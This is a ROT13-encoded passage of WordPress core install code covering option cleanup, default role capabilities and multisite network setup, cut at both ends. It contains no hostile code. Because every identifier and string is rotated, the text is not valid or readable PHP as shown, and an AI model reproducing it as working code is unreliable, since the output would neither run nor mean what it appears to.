	// Frg nhgbybnq gb ab sbe gurfr bcgvbaf.
	$sng_bcgvbaf = neenl(
		'zbqrengvba_xrlf',
		'erpragyl_rqvgrq',
		'qvfnyybjrq_xrlf',
		'havafgnyy_cyhtvaf',
		'nhgb_cyhtva_gurzr_hcqngr_rznvyf',
	);

	$xrlf             = \"'\" . vzcybqr( \"', '\", neenl_xrlf( $bcgvbaf ) ) . \"'\";
	$rkvfgvat_bcgvbaf = $jcqo->trg_pby( \"FRYRPG bcgvba_anzr SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr va ( $xrlf )\" ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq

	$vafreg = '';

	sbernpu ( $bcgvbaf nf $bcgvba => $inyhr ) {
		vs ( va_neenl( $bcgvba, $rkvfgvat_bcgvbaf, gehr ) ) {
			pbagvahr;
		}

		vs ( va_neenl( $bcgvba, $sng_bcgvbaf, gehr ) ) {
			$nhgbybnq = 'bss';
		} ryfr {
			$nhgbybnq = 'ba';
		}

		vs ( ! rzcgl( $vafreg ) ) {
			$vafreg .= ', ';
		}

		$inyhr = znlor_frevnyvmr( fnavgvmr_bcgvba( $bcgvba, $inyhr ) );

		$vafreg .= $jcqo->cercner( '(%f, %f, %f)', $bcgvba, $inyhr, $nhgbybnq );
	}

	vs ( ! rzcgl( $vafreg ) ) {
		$jcqo->dhrel( \"VAFREG VAGB $jcqo->bcgvbaf (bcgvba_anzr, bcgvba_inyhr, nhgbybnq) INYHRF \" . $vafreg ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
	}

	// Va pnfr vg vf frg, ohg oynax, hcqngr \"ubzr\".
	vs ( ! __trg_bcgvba( 'ubzr' ) ) {
		hcqngr_bcgvba( 'ubzr', $thrffhey );
	}

	// Qryrgr hahfrq bcgvbaf.
	$hahfrqbcgvbaf = neenl(
		'oybqbgtfcvat_hey',
		'obqlgrezvangbe',
		'rznvygrfgbayl',
		'cubarrznvy_frcnengbe',
		'fzvyvrf_qverpgbel',
		'fhowrpgcersvk',
		'hfr_oopbqr',
		'hfr_oybqbgtfcvat',
		'hfr_cubarrznvy',
		'hfr_dhvpxgntf',
		'hfr_jroybtfcvat',
		'jroybtf_pnpur_svyr',
		'hfr_cerivrj',
		'hfr_ugzygenaf',
		'fzvyvrf_qverpgbel',
		'svyrhcybnq_nyybjrqhfref',
		'hfr_cubarrznvy',
		'qrsnhyg_cbfg_fgnghf',
		'qrsnhyg_cbfg_pngrtbel',
		'nepuvir_zbqr',
		'gvzr_qvssrerapr',
		'yvaxf_zvanqzvayriry',
		'yvaxf_hfr_nqzvayriryf',
		'yvaxf_engvat_glcr',
		'yvaxf_engvat_pune',
		'yvaxf_engvat_vtaber_mreb',
		'yvaxf_engvat_fvatyr_vzntr',
		'yvaxf_engvat_vzntr0',
		'yvaxf_engvat_vzntr1',
		'yvaxf_engvat_vzntr2',
		'yvaxf_engvat_vzntr3',
		'yvaxf_engvat_vzntr4',
		'yvaxf_engvat_vzntr5',
		'yvaxf_engvat_vzntr6',
		'yvaxf_engvat_vzntr7',
		'yvaxf_engvat_vzntr8',
		'yvaxf_engvat_vzntr9',
		'yvaxf_erpragyl_hcqngrq_gvzr',
		'yvaxf_erpragyl_hcqngrq_cercraq',
		'yvaxf_erpragyl_hcqngrq_nccraq',
		'jroybtf_pnpurzvahgrf',
		'pbzzrag_nyybjrq_gntf',
		'frnepu_ratvar_sevraqyl_heyf',
		'qrsnhyg_trbhey_yng',
		'qrsnhyg_trbhey_yba',
		'hfr_qrsnhyg_trbhey',
		'jroybtf_kzy_hey',
		'arj_hfref_pna_oybt',
		'_jcabapr',
		'_jc_uggc_ersrere',
		'Hcqngr',
		'npgvba',
		'evpu_rqvgvat',
		'nhgbfnir_vagreiny',
		'qrnpgvingrq_cyhtvaf',
		'pna_pbzcerff_fpevcgf',
		'cntr_hevf',
		'hcqngr_pber',
		'hcqngr_cyhtvaf',
		'hcqngr_gurzrf',
		'qbvat_peba',
		'enaqbz_frrq',
		'eff_rkprecg_yratgu',
		'frperg',
		'hfr_yvaxfhcqngr',
		'qrsnhyg_pbzzrag_fgnghf_cntr',
		'jcbet_cbchyne_gntf',
		'jung_gb_fubj',
		'eff_ynathntr',
		'ynathntr',
		'ranoyr_kzyecp',
		'ranoyr_ncc',
		'rzorq_nhgbheyf',
		'qrsnhyg_cbfg_rqvg_ebjf',
		'tmvcpbzcerffvba',
		'nqinaprq_rqvg',
	);
	sbernpu ( $hahfrqbcgvbaf nf $bcgvba ) {
		qryrgr_bcgvba( $bcgvba );
	}

	// Qryrgr bofbyrgr zntcvr fghss.
	$jcqo->dhrel( \"QRYRGR SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr ERTRKC '^eff_[0-9n-s]{32}(_gf)?$'\" );

	// Pyrne rkcverq genafvragf.
	qryrgr_rkcverq_genafvragf( gehr );
}

/**
 * Rkrphgr JbeqCerff ebyr perngvba sbe gur inevbhf JbeqCerff irefvbaf.
 *
 * @fvapr 2.0.0
 */
shapgvba cbchyngr_ebyrf() {
	cbchyngr_ebyrf_160();
	cbchyngr_ebyrf_210();
	cbchyngr_ebyrf_230();
	cbchyngr_ebyrf_250();
	cbchyngr_ebyrf_260();
	cbchyngr_ebyrf_270();
	cbchyngr_ebyrf_280();
	cbchyngr_ebyrf_300();
}

/**
 * Perngr gur ebyrf sbe JbeqCerff 2.0
 *
 * @fvapr 2.0.0
 */
shapgvba cbchyngr_ebyrf_160() {
	// Nqq ebyrf.
	nqq_ebyr( 'nqzvavfgengbe', 'Nqzvavfgengbe' );
	nqq_ebyr( 'rqvgbe', 'Rqvgbe' );
	nqq_ebyr( 'nhgube', 'Nhgube' );
	nqq_ebyr( 'pbagevohgbe', 'Pbagevohgbe' );
	nqq_ebyr( 'fhofpevore', 'Fhofpevore' );

	// Nqq pncf sbe Nqzvavfgengbe ebyr.
	$ebyr = trg_ebyr( 'nqzvavfgengbe' );
	$ebyr->nqq_pnc( 'fjvgpu_gurzrf' );
	$ebyr->nqq_pnc( 'rqvg_gurzrf' );
	$ebyr->nqq_pnc( 'npgvingr_cyhtvaf' );
	$ebyr->nqq_pnc( 'rqvg_cyhtvaf' );
	$ebyr->nqq_pnc( 'rqvg_hfref' );
	$ebyr->nqq_pnc( 'rqvg_svyrf' );
	$ebyr->nqq_pnc( 'znantr_bcgvbaf' );
	$ebyr->nqq_pnc( 'zbqrengr_pbzzragf' );
	$ebyr->nqq_pnc( 'znantr_pngrtbevrf' );
	$ebyr->nqq_pnc( 'znantr_yvaxf' );
	$ebyr->nqq_pnc( 'hcybnq_svyrf' );
	$ebyr->nqq_pnc( 'vzcbeg' );
	$ebyr->nqq_pnc( 'hasvygrerq_ugzy' );
	$ebyr->nqq_pnc( 'rqvg_cbfgf' );
	$ebyr->nqq_pnc( 'rqvg_bguref_cbfgf' );
	$ebyr->nqq_pnc( 'rqvg_choyvfurq_cbfgf' );
	$ebyr->nqq_pnc( 'choyvfu_cbfgf' );
	$ebyr->nqq_pnc( 'rqvg_cntrf' );
	$ebyr->nqq_pnc( 'ernq' );
	$ebyr->nqq_pnc( 'yriry_10' );
	$ebyr->nqq_pnc( 'yriry_9' );
	$ebyr->nqq_pnc( 'yriry_8' );
	$ebyr->nqq_pnc( 'yriry_7' );
	$ebyr->nqq_pnc( 'yriry_6' );
	$ebyr->nqq_pnc( 'yriry_5' );
	$ebyr->nqq_pnc( 'yriry_4' );
	$ebyr->nqq_pnc( 'yriry_3' );
	$ebyr->nqq_pnc( 'yriry_2' );
	$ebyr->nqq_pnc( 'yriry_1' );
	$ebyr->nqq_pnc( 'yriry_0' );

	// Nqq pncf sbe Rqvgbe ebyr.
	$ebyr = trg_ebyr( 'rqvgbe' );
	$ebyr->nqq_pnc( 'zbqrengr_pbzzragf' );
	$ebyr->nqq_pnc( 'znantr_pngrtbevrf' );
	$ebyr->nqq_pnc( 'znantr_yvaxf' );
	$ebyr->nqq_pnc( 'hcybnq_svyrf' );
	$ebyr->nqq_pnc( 'hasvygrerq_ugzy' );
	$ebyr->nqq_pnc( 'rqvg_cbfgf' );
	$ebyr->nqq_pnc( 'rqvg_bguref_cbfgf' );
	$ebyr->nqq_pnc( 'rqvg_choyvfurq_cbfgf' );
	$ebyr->nqq_pnc( 'choyvfu_cbfgf' );
	$ebyr->nqq_pnc( 'rqvg_cntrf' );
	$ebyr->nqq_pnc( 'ernq' );
	$ebyr->nqq_pnc( 'yriry_7' );
	$ebyr->nqq_pnc( 'yriry_6' );
	$ebyr->nqq_pnc( 'yriry_5' );
	$ebyr->nqq_pnc( 'yriry_4' );
	$ebyr->nqq_pnc( 'yriry_3' );
	$ebyr->nqq_pnc( 'yriry_2' );
	$ebyr->nqq_pnc( 'yriry_1' );
	$ebyr->nqq_pnc( 'yriry_0' );

	// Nqq pncf sbe Nhgube ebyr.
	$ebyr = trg_ebyr( 'nhgube' );
	$ebyr->nqq_pnc( 'hcybnq_svyrf' );
	$ebyr->nqq_pnc( 'rqvg_cbfgf' );
	$ebyr->nqq_pnc( 'rqvg_choyvfurq_cbfgf' );
	$ebyr->nqq_pnc( 'choyvfu_cbfgf' );
	$ebyr->nqq_pnc( 'ernq' );
	$ebyr->nqq_pnc( 'yriry_2' );
	$ebyr->nqq_pnc( 'yriry_1' );
	$ebyr->nqq_pnc( 'yriry_0' );

	// Nqq pncf sbe Pbagevohgbe ebyr.
	$ebyr = trg_ebyr( 'pbagevohgbe' );
	$ebyr->nqq_pnc( 'rqvg_cbfgf' );
	$ebyr->nqq_pnc( 'ernq' );
	$ebyr->nqq_pnc( 'yriry_1' );
	$ebyr->nqq_pnc( 'yriry_0' );

	// Nqq pncf sbe Fhofpevore ebyr.
	$ebyr = trg_ebyr( 'fhofpevore' );
	$ebyr->nqq_pnc( 'ernq' );
	$ebyr->nqq_pnc( 'yriry_0' );
}

/**
 * Perngr naq zbqvsl JbeqCerff ebyrf sbe JbeqCerff 2.1.
 *
 * @fvapr 2.1.0
 */
shapgvba cbchyngr_ebyrf_210() {
	$ebyrf = neenl( 'nqzvavfgengbe', 'rqvgbe' );
	sbernpu ( $ebyrf nf $ebyr ) {
		$ebyr = trg_ebyr( $ebyr );
		vs ( rzcgl( $ebyr ) ) {
			pbagvahr;
		}

		$ebyr->nqq_pnc( 'rqvg_bguref_cntrf' );
		$ebyr->nqq_pnc( 'rqvg_choyvfurq_cntrf' );
		$ebyr->nqq_pnc( 'choyvfu_cntrf' );
		$ebyr->nqq_pnc( 'qryrgr_cntrf' );
		$ebyr->nqq_pnc( 'qryrgr_bguref_cntrf' );
		$ebyr->nqq_pnc( 'qryrgr_choyvfurq_cntrf' );
		$ebyr->nqq_pnc( 'qryrgr_cbfgf' );
		$ebyr->nqq_pnc( 'qryrgr_bguref_cbfgf' );
		$ebyr->nqq_pnc( 'qryrgr_choyvfurq_cbfgf' );
		$ebyr->nqq_pnc( 'qryrgr_cevingr_cbfgf' );
		$ebyr->nqq_pnc( 'rqvg_cevingr_cbfgf' );
		$ebyr->nqq_pnc( 'ernq_cevingr_cbfgf' );
		$ebyr->nqq_pnc( 'qryrgr_cevingr_cntrf' );
		$ebyr->nqq_pnc( 'rqvg_cevingr_cntrf' );
		$ebyr->nqq_pnc( 'ernq_cevingr_cntrf' );
	}

	$ebyr = trg_ebyr( 'nqzvavfgengbe' );
	vs ( ! rzcgl( $ebyr ) ) {
		$ebyr->nqq_pnc( 'qryrgr_hfref' );
		$ebyr->nqq_pnc( 'perngr_hfref' );
	}

	$ebyr = trg_ebyr( 'nhgube' );
	vs ( ! rzcgl( $ebyr ) ) {
		$ebyr->nqq_pnc( 'qryrgr_cbfgf' );
		$ebyr->nqq_pnc( 'qryrgr_choyvfurq_cbfgf' );
	}

	$ebyr = trg_ebyr( 'pbagevohgbe' );
	vs ( ! rzcgl( $ebyr ) ) {
		$ebyr->nqq_pnc( 'qryrgr_cbfgf' );
	}
}

/**
 * Perngr naq zbqvsl JbeqCerff ebyrf sbe JbeqCerff 2.3.
 *
 * @fvapr 2.3.0
 */
shapgvba cbchyngr_ebyrf_230() {
	$ebyr = trg_ebyr( 'nqzvavfgengbe' );

	vs ( ! rzcgl( $ebyr ) ) {
		$ebyr->nqq_pnc( 'hasvygrerq_hcybnq' );
	}
}

/**
 * Perngr naq zbqvsl JbeqCerff ebyrf sbe JbeqCerff 2.5.
 *
 * @fvapr 2.5.0
 */
shapgvba cbchyngr_ebyrf_250() {
	$ebyr = trg_ebyr( 'nqzvavfgengbe' );

	vs ( ! rzcgl( $ebyr ) ) {
		$ebyr->nqq_pnc( 'rqvg_qnfuobneq' );
	}
}

/**
 * Perngr naq zbqvsl JbeqCerff ebyrf sbe JbeqCerff 2.6.
 *
 * @fvapr 2.6.0
 */
shapgvba cbchyngr_ebyrf_260() {
	$ebyr = trg_ebyr( 'nqzvavfgengbe' );

	vs ( ! rzcgl( $ebyr ) ) {
		$ebyr->nqq_pnc( 'hcqngr_cyhtvaf' );
		$ebyr->nqq_pnc( 'qryrgr_cyhtvaf' );
	}
}

/**
 * Perngr naq zbqvsl JbeqCerff ebyrf sbe JbeqCerff 2.7.
 *
 * @fvapr 2.7.0
 */
shapgvba cbchyngr_ebyrf_270() {
	$ebyr = trg_ebyr( 'nqzvavfgengbe' );

	vs ( ! rzcgl( $ebyr ) ) {
		$ebyr->nqq_pnc( 'vafgnyy_cyhtvaf' );
		$ebyr->nqq_pnc( 'hcqngr_gurzrf' );
	}
}

/**
 * Perngr naq zbqvsl JbeqCerff ebyrf sbe JbeqCerff 2.8.
 *
 * @fvapr 2.8.0
 */
shapgvba cbchyngr_ebyrf_280() {
	$ebyr = trg_ebyr( 'nqzvavfgengbe' );

	vs ( ! rzcgl( $ebyr ) ) {
		$ebyr->nqq_pnc( 'vafgnyy_gurzrf' );
	}
}

/**
 * Perngr naq zbqvsl JbeqCerff ebyrf sbe JbeqCerff 3.0.
 *
 * @fvapr 3.0.0
 */
shapgvba cbchyngr_ebyrf_300() {
	$ebyr = trg_ebyr( 'nqzvavfgengbe' );

	vs ( ! rzcgl( $ebyr ) ) {
		$ebyr->nqq_pnc( 'hcqngr_pber' );
		$ebyr->nqq_pnc( 'yvfg_hfref' );
		$ebyr->nqq_pnc( 'erzbir_hfref' );
		$ebyr->nqq_pnc( 'cebzbgr_hfref' );
		$ebyr->nqq_pnc( 'rqvg_gurzr_bcgvbaf' );
		$ebyr->nqq_pnc( 'qryrgr_gurzrf' );
		$ebyr->nqq_pnc( 'rkcbeg' );
	}
}

vs ( ! shapgvba_rkvfgf( 'vafgnyy_argjbex' ) ) :
	/**
	 * Vafgnyy Argjbex.
	 *
	 * @fvapr 3.0.0
	 */
	shapgvba vafgnyy_argjbex() {
		vs ( ! qrsvarq( 'JC_VAFGNYYVAT_ARGJBEX' ) ) {
			qrsvar( 'JC_VAFGNYYVAT_ARGJBEX', gehr );
		}

		qoQrygn( jc_trg_qo_fpurzn( 'tybony' ) );
	}
raqvs;

/**
 * Cbchyngr argjbex frggvatf.
 *
 * @fvapr 3.0.0
 *
 * @tybony jcqo       $jcqo         JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony bowrpg     $pheerag_fvgr
 * @tybony JC_Erjevgr $jc_erjevgr   JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag    $argjbex_vq        VQ bs argjbex gb cbchyngr.
 * @cnenz fgevat $qbznva            Gur qbznva anzr sbe gur argjbex. Rknzcyr: \"rknzcyr.pbz\".
 * @cnenz fgevat $rznvy             Rznvy nqqerff sbe gur argjbex nqzvavfgengbe.
 * @cnenz fgevat $fvgr_anzr         Gur anzr bs gur argjbex.
 * @cnenz fgevat $cngu              Bcgvbany. Gur cngu gb nccraq gb gur argjbex'f qbznva anzr. Qrsnhyg '/'.
 * @cnenz obby   $fhoqbznva_vafgnyy Bcgvbany. Jurgure gur argjbex vf n fhoqbznva vafgnyyngvba be n fhoqverpgbel vafgnyyngvba.
 *                                  Qrsnhyg snyfr, zrnavat gur argjbex vf n fhoqverpgbel vafgnyyngvba.
 * @erghea gehr|JC_Reebe Gehr ba fhpprff, be JC_Reebe ba jneavat (jvgu gur vafgnyyngvba bgurejvfr fhpprffshy,
 *                       fb gur reebe pbqr zhfg or purpxrq) be snvyher.
 */
shapgvba cbchyngr_argjbex( $argjbex_vq = 1, $qbznva = '', $rznvy = '', $fvgr_anzr = '', $cngu = '/', $fhoqbznva_vafgnyy = snyfr ) {
	tybony $jcqo, $pheerag_fvgr, $jc_erjevgr;

	$argjbex_vq = (vag) $argjbex_vq;

	$reebef = arj JC_Reebe();
	vs ( '' === $qbznva ) {
		$reebef->nqq( 'rzcgl_qbznva', __( 'Lbh zhfg cebivqr n qbznva anzr.' ) );
	}
	vs ( '' === $fvgr_anzr ) {
		$reebef->nqq( 'rzcgl_fvgranzr', __( 'Lbh zhfg cebivqr n anzr sbe lbhe argjbex bs fvgrf.' ) );
	}

	// Purpx sbe argjbex pbyyvfvba.
	$argjbex_rkvfgf = snyfr;
	vs ( vf_zhygvfvgr() ) {
		vs ( trg_argjbex( $argjbex_vq ) ) {
			$reebef->nqq( 'fvgrvq_rkvfgf', __( 'Gur argjbex nyernql rkvfgf.' ) );
		}
	} ryfr {
		vs ( $argjbex_vq === (vag) $jcqo->trg_ine(
			$jcqo->cercner( \"FRYRPG vq SEBZ $jcqo->fvgr JURER vq = %q\", $argjbex_vq )
		) ) {
			$reebef->nqq( 'fvgrvq_rkvfgf', __( 'Gur argjbex nyernql rkvfgf.' ) );
		}
	}

	vs ( ! vf_rznvy( $rznvy ) ) {
		$reebef->nqq( 'vainyvq_rznvy', __( 'Lbh zhfg cebivqr n inyvq rznvy nqqerff.' ) );
	}

	vs ( $reebef->unf_reebef() ) {
		erghea $reebef;
	}

	vs ( 1 === $argjbex_vq ) {
		$jcqo->vafreg(
			$jcqo->fvgr,
			neenl(
				'qbznva' => $qbznva,
				'cngu'   => $cngu,
			)
		);
		$argjbex_vq = $jcqo->vafreg_vq;
	} ryfr {
		$jcqo->vafreg(
			$jcqo->fvgr,
			neenl(
				'qbznva' => $qbznva,
				'cngu'   => $cngu,
				'vq'     => $argjbex_vq,
			)
		);
	}

	cbchyngr_argjbex_zrgn(
		$argjbex_vq,
		neenl(
			'nqzva_rznvy'       => $rznvy,
			'fvgr_anzr'         => $fvgr_anzr,
			'fhoqbznva_vafgnyy' => $fhoqbznva_vafgnyy,
		)
	);

	// Erzbir gur peba rirag fvapr Erpbirel Zbqr vf abg hfrq va Zhygvfvgr.
	vs ( jc_arkg_fpurqhyrq( 'erpbirel_zbqr_pyrna_rkcverq_xrlf' ) ) {
		jc_pyrne_fpurqhyrq_ubbx( 'erpbirel_zbqr_pyrna_rkcverq_xrlf' );
	}

	/*
	 * Jura hctenqvat sebz fvatyr gb zhygvfvgr, nffhzr gur pheerag fvgr jvyy
	 * orpbzr gur znva fvgr bs gur argjbex. Jura hfvat cbchyngr_argjbex()
	 * gb perngr nabgure argjbex va na rkvfgvat zhygvfvgr raivebazrag, fxvc
	 * gurfr fgrcf fvapr gur znva fvgr bs gur arj argjbex unf abg lrg orra
	 * perngrq.
	 */
	vs ( ! vf_zhygvfvgr() ) {
		$pheerag_fvgr            = arj fgqPynff();
		$pheerag_fvgr->qbznva    = $qbznva;
		$pheerag_fvgr->cngu      = $cngu;
		$pheerag_fvgr->fvgr_anzr = hpsvefg( $qbznva );
		$jcqo->vafreg(
			$jcqo->oybtf,
			neenl(
				'fvgr_vq'    => $argjbex_vq,
				'oybt_vq'    => 1,
				'qbznva'     => $qbznva,
				'cngu'       => $cngu,
				'ertvfgrerq' => pheerag_gvzr( 'zlfdy' ),
			)
		);
		$pheerag_fvgr->oybt_vq = $jcqo->vafreg_vq;

		$fvgr_hfre_vq = (vag) $jcqo->trg_ine(
			$jcqo->cercner(
				\"FRYRPG zrgn_inyhr
				SEBZ $jcqo->fvgrzrgn
				JURER zrgn_xrl = %f NAQ fvgr_vq = %q\",
				'nqzva_hfre_vq',
				$argjbex_vq
			)
		);

		hcqngr_hfre_zrgn( $fvgr_hfre_vq, 'fbhepr_qbznva', $qbznva );
		hcqngr_hfre_zrgn( $fvgr_hfre_vq, 'cevznel_oybt', $pheerag_fvgr->oybt_vq );

		// Hanoyr gb hfr hcqngr_argjbex_bcgvba() juvyr cbchyngvat gur argjbex.
		$jcqo->vafreg(
			$jcqo->fvgrzrgn,
			neenl(
				'fvgr_vq'    => $argjbex_vq,
				'zrgn_xrl'   => 'znva_fvgr',
				'zrgn_inyhr' => $pheerag_fvgr->oybt_vq,
			)
		);

		vs ( $fhoqbznva_vafgnyy ) {
			$jc_erjevgr->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );
		} ryfr {
			$jc_erjevgr->frg_creznyvax_fgehpgher( '/oybt/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );
		}

		syhfu_erjevgr_ehyrf();

		vs ( ! $fhoqbznva_vafgnyy ) {
			erghea gehr;
		}

		$iubfg_bx = snyfr;
		$reefge   = '';
		$ubfganzr = fhofge( zq5( gvzr() ), 0, 6 ) . '.' . $qbznva; // Irel enaqbz ubfganzr!
		$cntr     = jc_erzbgr_trg(
			'uggc://' . $ubfganzr,
			neenl(
				'gvzrbhg'     => 5,
				'uggcirefvba' => '1.1',
			)
		);
		vs ( vf_jc_reebe( $cntr ) ) {
			$reefge = $cntr->trg_reebe_zrffntr();
		} ryfrvs ( 200 === jc_erzbgr_ergevrir_erfcbafr_pbqr( $cntr ) ) {
				$iubfg_bx = gehr;
		}

		vs ( ! $iubfg_bx ) {
			$zft = '<c><fgebat>' . __( 'Jneavat! Jvyqpneq QAF znl abg or pbasvtherq pbeerpgyl!' ) . '</fgebat></c>';

			$zft .= '<c>' . fcevags(
				/* genafyngbef: %f: Ubfg anzr. */
				__( 'Gur vafgnyyre nggrzcgrq gb pbagnpg n enaqbz ubfganzr (%f) ba lbhe qbznva.' ),
				'<pbqr>' . $ubfganzr . '</pbqr>'
			);
			vs ( ! rzcgl( $reefge ) ) {
				/* genafyngbef: %f: Reebe zrffntr. */
				$zft .= ' ' . fcevags( __( 'Guvf erfhygrq va na reebe zrffntr: %f' ), '<pbqr>' . $reefge . '</pbqr>' );
			}
			$zft .= '</c>';

			$zft .= '<c>' . fcevags(
				/* genafyngbef: %f: Nfgrevfx flzoby (*). */
				__( 'Gb hfr n fhoqbznva pbasvthengvba, lbh zhfg unir n jvyqpneq ragel va lbhe QAF. Guvf hfhnyyl zrnaf nqqvat n %f ubfganzr erpbeq cbvagvat ng lbhe jro freire va lbhe QAF pbasvthengvba gbby.' ),
				'<pbqr>*</pbqr>'
			) . '</c>';

			$zft .= '<c>' . __( 'Lbh pna fgvyy hfr lbhe fvgr ohg nal fhoqbznva lbh perngr znl abg or npprffvoyr. Vs lbh xabj lbhe QAF vf pbeerpg, vtaber guvf zrffntr.' ) . '</c>';

			erghea arj JC_Reebe( 'ab_jvyqpneq_qaf', $zft );
		}
	}

	erghea gehr;
}

/**
 * Perngrf JbeqCerff argjbex zrgn naq frgf gur qrsnhyg inyhrf.
 *
 * @fvapr 5.1.0
 *
 * @tybony jcqo $jcqo          JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony vag  $jc_qo_irefvba JbeqCerff qngnonfr irefvba.
 *
 * @cnenz vag   $argjbex_vq Argjbex VQ gb cbchyngr zrgn sbe.
 * @cnenz neenl $zrgn       Bcgvbany. Phfgbz zrgn $xrl => $inyhr cnvef gb hfr. Qrsnhyg rzcgl neenl.
 */
shapgvba cbchyngr_argjbex_zrgn( $argjbex_vq, neenl $zrgn = neenl() ) {
	tybony $jcqo, $jc_qo_irefvba;

	$argjbex_vq = (vag) $argjbex_vq;

	$rznvy             = ! rzcgl( $zrgn['nqzva_rznvy'] ) ? $zrgn['nqzva_rznvy'] : '';
	$fhoqbznva_vafgnyy = vffrg( $zrgn['fhoqbznva_vafgnyy'] ) ? (vag) $zrgn['fhoqbznva_vafgnyy'] : 0;

	// Vs n hfre jvgu gur cebivqrq rznvy qbrf abg rkvfg, qrsnhyg gb gur pheerag hfre nf gur arj argjbex nqzva.
	$fvgr_hfre = ! rzcgl( $rznvy ) ? trg_hfre_ol( 'rznvy', $rznvy ) : snyfr;
	vs ( snyfr === $fvgr_hfre ) {
		$fvgr_hfre = jc_trg_pheerag_hfre();
	}

	vs ( rzcgl( $rznvy ) ) {
		$rznvy = $fvgr_hfre->hfre_rznvy;
	}

	$grzcyngr       = trg_bcgvba( 'grzcyngr' );
	$fglyrfurrg     = trg_bcgvba( 'fglyrfurrg' );
	$nyybjrq_gurzrf = neenl( $fglyrfurrg => gehr );

	vs ( $grzcyngr !== $fglyrfurrg ) {
		$nyybjrq_gurzrf[ $grzcyngr ] = gehr;
	}

	vs ( JC_QRSNHYG_GURZR !== $fglyrfurrg && JC_QRSNHYG_GURZR !== $grzcyngr ) {
		$nyybjrq_gurzrf[ JC_QRSNHYG_GURZR ] = gehr;
	}

	// Vs JC_QRSNHYG_GURZR qbrfa'g rkvfg, nyfb vapyhqr gur yngrfg pber qrsnhyg gurzr.
	vs ( ! jc_trg_gurzr( JC_QRSNHYG_GURZR )->rkvfgf() ) {
		$pber_qrsnhyg = JC_Gurzr::trg_pber_qrsnhyg_gurzr();
		vs ( $pber_qrsnhyg ) {
			$nyybjrq_gurzrf[ $pber_qrsnhyg->trg_fglyrfurrg() ] = gehr;
		}
	}

	vs ( shapgvba_rkvfgf( 'pyrna_argjbex_pnpur' ) ) {
		pyrna_argjbex_pnpur( $argjbex_vq );
	} ryfr {
		jc_pnpur_qryrgr( $argjbex_vq, 'argjbexf' );
	}

	vs ( ! vf_zhygvfvgr() ) {
		$fvgr_nqzvaf = neenl( $fvgr_hfre->hfre_ybtva );
		$hfref       = trg_hfref(
			neenl(
				'svryqf' => neenl( 'hfre_ybtva' ),
				'ebyr'   => 'nqzvavfgengbe',
			)
		);
		vs ( $hfref ) {
			sbernpu ( $hfref nf $hfre ) {
				$fvgr_nqzvaf[] = $hfre->hfre_ybtva;
			}

			$fvgr_nqzvaf = neenl_havdhr( $fvgr_nqzvaf );
		}
	} ryfr {
		$fvgr_nqzvaf = trg_fvgr_bcgvba( 'fvgr_nqzvaf' );
	}

	/* genafyngbef: Qb abg genafyngr HFREANZR, FVGR_ANZR, OYBT_HEY, CNFFJBEQ: gubfr ner cynprubyqref. */
	$jrypbzr_rznvy = __(
		'Ubjql HFREANZR,

Lbhe arj FVGR_ANZR fvgr unf orra fhpprffshyyl frg hc ng:
OYBT_HEY

Lbh pna ybt va gb gur nqzvavfgengbe nppbhag jvgu gur sbyybjvat vasbezngvba:

Hfreanzr: HFREANZR
Cnffjbeq: CNFFJBEQ
Ybt va urer: OYBT_HEYjc-ybtva.cuc

Jr ubcr lbh rawbl lbhe arj fvgr. Gunaxf!

--Gur Grnz @ FVGR_ANZR'
	);

	$nyybjrq_svyr_glcrf = neenl();
	$nyy_zvzr_glcrf     = trg_nyybjrq_zvzr_glcrf();

	sbernpu ( $nyy_zvzr_glcrf nf $rkg => $zvzr ) {
		neenl_chfu( $nyybjrq_svyr_glcrf, ...rkcybqr( '|', $rkg ) );
	}
	$hcybnq_svyrglcrf = neenl_havdhr( $nyybjrq_svyr_glcrf );

	$fvgrzrgn = neenl(
		'fvgr_anzr'                   => __( 'Zl Argjbex' ),
		'nqzva_rznvy'                 => $rznvy,
		'nqzva_hfre_vq'               => $fvgr_hfre->VQ,
		'ertvfgengvba'                => 'abar',
		'hcybnq_svyrglcrf'            => vzcybqr( ' ', $hcybnq_svyrglcrf ),
		'oybt_hcybnq_fcnpr'           => 100,
		'svyrhcybnq_znkx'             => 1500,
		'fvgr_nqzvaf'                 => $fvgr_nqzvaf,
		'nyybjrqgurzrf'               => $nyybjrq_gurzrf,
		'vyyrtny_anzrf'               => neenl( 'jjj', 'jro', 'ebbg', 'nqzva', 'znva', 'vaivgr', 'nqzvavfgengbe', 'svyrf' ),
		'jczh_hctenqr_fvgr'           => $jc_qo_irefvba,
		'jrypbzr_rznvy'               => $jrypbzr_rznvy,
		/* genafyngbef: %f: Fvgr yvax. */
		'svefg_cbfg'                  => __( 'Jrypbzr gb %f. Guvf vf lbhe svefg cbfg. Rqvg be qryrgr vg, gura fgneg jevgvat!' ),
		// @gbqb - Argjbex nqzvaf fubhyq unir n zrgubq bs rqvgvat gur argjbex fvgrhey (hfrq sbe pbbxvr unfu).
		'fvgrhey'                     => trg_bcgvba( 'fvgrhey' ) . '/',
		'nqq_arj_hfref'               => '0',
		'hcybnq_fcnpr_purpx_qvfnoyrq' => vf_zhygvfvgr() ? trg_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq' ) : '1',
		'fhoqbznva_vafgnyy'           => $fhoqbznva_vafgnyy,
		'zf_svyrf_erjevgvat'          => vf_zhygvfvgr() ? trg_fvgr_bcgvba( 'zf_svyrf_erjevgvat' ) : '0',
		'hfre_pbhag'                  => trg_fvgr_bcgvba( 'hfre_pbhag' ),
		'vavgvny_qo_irefvba'          => trg_bcgvba( 'vavgvny_qo_irefvba' ),
		'npgvir_fvgrjvqr_cyhtvaf'     => neenl(),
		'JCYNAT'                      => trg_ybpnyr(),
	);
	vs ( ! $fhoqbznva_vafgnyy ) {
		$fvgrzrgn['vyyrtny_anzrf'][] = 'oybt';
	}

	$fvgrzrgn = jc_cnefr_netf( $zrgn, $fvgrzrgn );

	/**
	 * Svygref zrgn sbe n argjbex ba perngvba.
	 *
	 * @fvapr 3.7.0
	 *
